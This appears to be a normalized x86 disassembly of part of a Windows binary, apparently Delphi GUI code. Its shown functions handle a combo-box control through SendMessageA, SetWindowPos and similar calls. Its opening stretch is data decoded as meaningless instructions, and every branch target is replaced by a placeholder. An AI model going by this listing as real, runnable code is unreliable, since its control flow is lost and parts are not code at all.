add [ esi + 0x395c0043 ] ah
inc esp
add [ eax + 0x39 ] dh
inc esp
add ah bl
inc bx
add [ eax + 0x38004439 ] bl
inc ebx
add [ edi + eax + 0x43 ] dl
add [ eax + 0x67 ] bl
inc ebx
add [ eax - 0x6fffbbc7 ] ch
pushfd
inc ebx
add [ eax + ebp * 2 + 0x43 ] cl
add [ eax + ebp * 2 + 0x67780043 ] cl
inc ebx
add [ ecx + edi + 0x39c00044 ] bh
inc esp
add [ edi + 0x650c0043 ] bl
inc ebx
add [ ecx ] dl
push esp
inc edx
jne r-xdata
inc esp
jb r-xdata
add ah ah
mov edx 0x322c0043
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ebp + ebx * 4 - 0x15bfffbd ] bh
inc ebx
je r-xdata
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax - 0x7ffbe4f ] ah
push es
inc ebx
add al 0x21
inc ebx
add [ eax + 0x500043df ] al
mov ebp 0xf1100043
inc ebx
add ah bh
fild [ ebx ]
in al dx
fiadd [ ebx ]
pop esp
or [ ebx ] al
or [ eax ] 0x43
add [ eax ] bh
or al [ ebx ]
or [ eax ] al
add eax 0x7b006b0
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
add [ eax + 0x78 ] al
inc ebx
add [ eax + ecx - 0x653fffbd ] al
inc ebx
add [ eax + 0x5c0043dd ] ah
fiadd [ ebx ]
pop eax
fld [ ebx ]
inc eax
fiadd [ ebx ]
fcomp [ edi - 0x5993ffbd ]
inc ebx
add [ esp + esi * 4 ] cl
inc ebx
add al al
or al [ ebx ]
hlt
fdiv [ eax + eax * 2 ]
outsb
inc ebx
outsd
outsb
je r-xdata
dec eax
[ eax ]
xor al [ eax ]
dec eax
xor al [ eax ]
mov esp 0x4000439d
0xb2ac0043 0x43
outsd
insb
lea eax [ eax ]
mov eax 0x70042ce
push cs
push esp
inc edx
jne r-xdata
add [ eax + 0x7c004398 ] al
insb
inc ebx
inc ebx
add [ edi + eax * 2 + 0x41 ] ch
je r-xdata
add [ edx + esi * 4 + 0x476c0043 ] ch
inc ecx
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax - 0x61 ] ah
inc ebx
add [ ebp + esi * 2 - 0x4f33ffbd ] dl
inc ecx
sbb [ eax + 0x6c7c0043 ] 0x43
outsd
insb
mov eax 0xfc0042cd
inc ebx
add [ ebx ] cl
add [ eax ] cl
push ebx
je r-xdata
inc ebx
add [ esp + ebp * 2 + 0x43 ] bh
inc ebx
je r-xdata
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ ecx + ecx - 0x1aabffbd ] ch
inc ebx
add [ eax - 0x16 ] dh
inc ebx
add [ ecx + ebp * 8 + 0x6af00043 ] bh
inc ebx
add [ eax ] dl
inc ebx
add [ eax ] dh
inc ebx
add [ ebp + ebx * 8 + 0x43 ] cl
add [ eax ] bh
push 0x43
add [ edx + ebp * 2 ] bh
inc ebx
add [ eax - 0x66 ] dl
inc ebx
add [ edx + ebx * 4 + 0x43 ] bh
add [ ebp + esi * 2 + 0x43 ] bh
add [ ebx + ebp * 2 + 0x77080043 ] dh
inc ebx
add [ eax - 0x6bffbc8a ] al
jns r-xdata
insb
jae r-xdata
add [ ebp - 0x30d3ffc0 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x30 ] al
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ edx ] 0x1
xor dl al
inc edx
add [ eax ] bl
add al [ eax ]
add [ ebp + ecx * 8 + 0x42 ] ch
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
sub_42e7c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42e82a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push edi
push 0x150
mov eax [ ebx + 0x10 ]
call sub_43df6c
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e831
lea eax [ ebp - 0x4 ]
call sub_404050
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_41552c
sub_42e83c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x151
mov eax [ ebx + 0x10 ]
call sub_43df6c
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42e860
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
push 0x0
push edi
push 0x149
mov eax [ ebx + 0x10 ]
call sub_43df6c
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax esi
xor edx edx
call sub_40469c
mov edx esi
xchg edx eax
call sub_40469c
mov eax [ esi ]
call sub_404510
push eax
push edi
push 0x148
mov eax [ ebx + 0x10 ]
call sub_43df6c
push eax
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42e8b8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42e91c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_4377ac
push 0x0
push 0x0
push 0x14b
mov eax [ ebx + 0x10 ]
call sub_43df6c
push eax
call SendMessageA
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_4377dc
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x88 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e923
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_42e928
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x144
mov eax [ ebx + 0x10 ]
call sub_43df6c
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42e948
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404510
push eax
push 0xffffffff
push 0x158
mov eax [ ebx + 0x10 ]
call sub_43df6c
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42e970
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_43df6c
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_437ce8
sub_42e9a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42ea17
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404510
push eax
push 0x0
push 0x143
mov eax [ ebx + 0x10 ]
call sub_43df6c
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ea1e
lea eax [ ebp - 0x4 ]
call sub_404050
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
sub_42ea28
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42ea9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_404510
push eax
push esi
push 0x14a
mov eax [ ebx + 0x10 ]
call sub_43df6c
push eax
call SendMessageA
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42eaa2
lea eax [ ebp - 0x4 ]
call sub_404050
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
sub_42eaa8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_439c98
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x91
mov eax ebx
call sub_436f68
mov edx 0x19
mov eax ebx
call sub_436f8c
mov dl 0x1
mov eax ebx
call sub_43e1a0
xor edx edx
mov eax ebx
call sub_437970
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e2d4
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_436388
mov [ ebx + 0x238 ] 0x10
push ebx
push sub_42ee4c
call sub_41b9d4
mov [ ebx + 0x24c ] eax
push ebx
push sub_42ef44
call sub_41b9d4
mov [ ebx + 0x254 ] eax
mov [ ebx + 0x210 ] 0x8
mov [ ebx + 0x214 ] 0xffffffff
mov [ ebx + 0x260 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_42eb9c
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax esi
call sub_43e270
test al al
je r-xdata
mov eax [ esi + 0x254 ]
call sub_44df54
mov eax [ esi + 0x24c ]
call sub_44df54
mov eax [ esi + 0x208 ]
call sub_403294
mov edx ebx
and dl 0xfc
mov eax esi
call sub_439dbc
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_42ec1e
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_43b360
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
xor eax eax
mov [ ebx + 0x248 ] eax
pop ebx
retn
sub_42ec68
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x157
mov eax ebx
call sub_43df6c
push eax
call SendMessageA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_42ec8c
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
push 0x0
xor eax eax
mov al bl
push eax
push 0x14f
mov eax esi
call sub_43df6c
push eax
call SendMessageA
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax esi
call sub_43df6c
push eax
call InvalidateRect
add esp 0x10
pop esi
pop ebx
retn
sub_42ecd4
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
push 0x0
push 0x0
push 0x147
mov eax ebx
call sub_43df6c
push eax
call SendMessageA
pop ebx
retn
mov eax [ ebx + 0x214 ]
pop ebx
retn
sub_42ed00
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
mov [ ebx + 0x214 ] esi
pop esi
pop ebx
retn
pop esi
pop ebx
retn
push 0x0
push esi
push 0x14e
mov eax ebx
call sub_43df6c
push eax
call SendMessageA
sub_42ed3c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jge r-xdata
cmp esi [ ebx + 0x20c ]
je r-xdata
xor esi esi
pop esi
pop ebx
retn
mov [ ebx + 0x20c ] esi
mov eax ebx
call sub_43e270
test al al
je r-xdata
push 0x0
push esi
push 0x141
mov eax ebx
call sub_43df6c
push eax
call SendMessageA
sub_42ed8c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x64 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x64 ]
push eax
mov eax esi
call sub_43df6c
push eax
call SetWindowTextA
sub_42edc8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_42ec68
test al al
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x4
sub_42ee00
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43d584
pop esi
pop ebx
retn
mov eax ebx
call sub_43b50c
sub_42ee24
push ebx
mov ebx eax
mov eax ebx
call sub_43939c
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42ee4c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ esi ] 0x112
jne r-xdata
mov eax [ esi ]
cmp eax 0x100
jb r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
jmp r-xdata
mov eax [ ebx + 0x250 ]
push eax
mov edx esi
mov ecx [ ebx + 0x240 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xf4 ]
mov eax [ esi ]
sub eax 0x30
je r-xdata
cmp eax 0x108
ja r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x1d1
je r-xdata
mov eax ebx
call sub_44e0a8
mov edi eax
test edi edi
je r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
sub eax 0x2
jne r-xdata
mov ecx esi
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_4372f0
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406a04
push eax
push 0x0
push 0x202
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_437e6c
jmp r-xdata
sub_42ef78
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42f22f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x104
jg r-xdata
cmp eax 0xbd00
jg r-xdata
je r-xdata
sub eax 0xbd02
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x244 ]
je r-xdata
cmp eax 0x87
jg r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
sub eax 0x105
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
mov eax [ ebp + 0x8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
cmp [ ebx ] 0x203
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43cdc0
test al al
je r-xdata
sub eax 0x100
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43cea8
test al al
je r-xdata
sub eax 0xfb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x80
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42ec68
test al al
je r-xdata
sub eax 0x7
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_457854
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_403490
dec eax
je r-xdata
mov [ ebx + 0xc ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44e0a8
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42e684
test al al
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43cf70
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
je r-xdata
sub eax 0x7c
je r-xdata
movsx eax [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
movsx eax [ ebx + 0xa ]
mov [ ebp - 0x8 ] eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
push esi
call MapWindowPoints
mov ax [ ebp - 0xc ]
mov [ ebx + 0x8 ] ax
mov ax [ ebp - 0x8 ]
mov [ ebx + 0xa ] ax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov di [ ebx + 0x4 ]
cmp di 0xd
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_42ec68
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42ec8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_42f254
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
sub eax 0x5
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub eax 0xfd
je r-xdata
mov eax ebx
call sub_437f34
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
mov edx esi
mov eax ebx
call sub_43b980
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_43cf70
test al al
jne r-xdata
add eax 0xffffffd0
sub eax 0x7
jb r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
cmp di 0xd
je r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41d4f8
push eax
mov eax [ esi + 0x4 ]
push eax
call SetTextColor
mov eax [ ebx + 0x170 ]
call sub_41e17c
call sub_41d4f8
push eax
mov eax [ esi + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0x170 ]
call sub_41e1b8
mov [ esi + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov edx esi
mov eax ebx
call sub_43b8ec
test al al
jne r-xdata
mov eax ebx
call sub_42ec68
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
xor edx edx
mov eax ebx
call sub_42ec8c
jmp r-xdata
sub_42f362
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_42f4c0
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ edx + 0x6 ]
cmp eax 0x8
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f4c7
lea eax [ ebp - 0x4 ]
call sub_404050
retn
jmp [ eax * 4 + jump_table_42f390 ]
mov eax edi
mov si 0xffe9
call sub_403490
jmp r-xdata
mov eax edi
mov si 0xffb3
call sub_403490
jmp r-xdata
mov [ edi + 0x25d ] 0x0
mov eax edi
mov si 0xffb1
call sub_403490
mov eax edi
mov edx [ eax ]
call [ edx + 0xf0 ]
cmp [ edi + 0x25d ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ edi + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4377dc
mov eax edi
mov si 0xffeb
call sub_403490
mov eax edi
mov si 0xffb2
call sub_403490
jmp r-xdata
mov eax edi
mov si 0xffb0
call sub_403490
jmp r-xdata
mov [ edi + 0x25e ] 0x1
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_43c6f0
jmp r-xdata
mov [ edi + 0x25e ] 0x0
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_43c7dc
push 0x0
push 0x0
push 0x1f
mov eax edi
call sub_43df6c
push eax
call PostMessageA
cmp [ edi + 0x25e ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x14f
mov eax edi
call sub_43df6c
push eax
call PostMessageA
jmp r-xdata
sub_42f4f4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42f59d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x208 ]
call sub_4363a0
cmp [ ebx + 0x282 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x208 ]
call sub_41e528
test esi esi
jl r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x284 ]
call [ ebx + 0x280 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f5a4
lea eax [ ebp - 0x14 ]
call sub_404050
retn
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebx + 0x23c ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x10 ]
add edx 0x2
mov ecx [ ebp - 0xc ]
mov eax [ ebx + 0x208 ]
call sub_41e694
sub_42f5d0
push esi
push edi
mov esi eax
mov eax esi
call sub_439880
mov edi [ esi + 0x214 ]
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_42f5f8
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_43e270
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_42f64c
push ebx
push esi
cmp [ eax + 0x222 ] 0x0
je r-xdata
mov si 0xffb3
call sub_403490
pop esi
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
pop esi
pop ebx
retn
sub_42f678
push ebx
mov ebx eax
mov eax ebx
call sub_43af24
push 0x0
mov eax [ ebx + 0x20c ]
push eax
push 0x141
mov eax ebx
call sub_43df6c
push eax
call SendMessageA
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
pop ebx
retn
sub_42f6b0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
cmp ebx eax
jle r-xdata
cmp ebx 0x1
jge r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x1
xor eax eax
push ebp
push sub_42f746
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x9e
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
imul ebx
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x4c ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f74d
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x0
retn
mov ebx 0x1
sub_42f74d
push 0x5f
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
pop ebx
pop ecx
pop ebp
retn
sub_42f76c
push esi
push edi
mov esi eax
mov edi [ esi + 0x23c ]
test edi edi
je r-xdata
mov [ esi + 0x23c ] edx
pop edi
pop esi
retn
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub_42f79c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42f81b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f822
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax esi
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_42f828
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_42f868
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_42f8b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f8b8
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_42f8c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42eaa8
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov dl 0x1
call sub_403264
mov esi eax
mov [ ebx + 0x23c ] esi
mov [ esi + 0x10 ] ebx
mov [ ebx + 0x238 ] 0x10
mov [ ebx + 0x276 ] 0x0
xor eax eax
mov [ ebx + 0x26c ] eax
mov [ ebx + 0x268 ] 0x1
mov [ ebx + 0x290 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_42f944
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x23c ]
call sub_403294
mov eax [ esi + 0x278 ]
call sub_403294
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42eb9c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_42f994
push ebx
mov ebx eax
cmp dl [ ebx + 0x276 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x276 ] dl
cmp dl 0x1
jne r-xdata
mov eax [ r-xdata ]
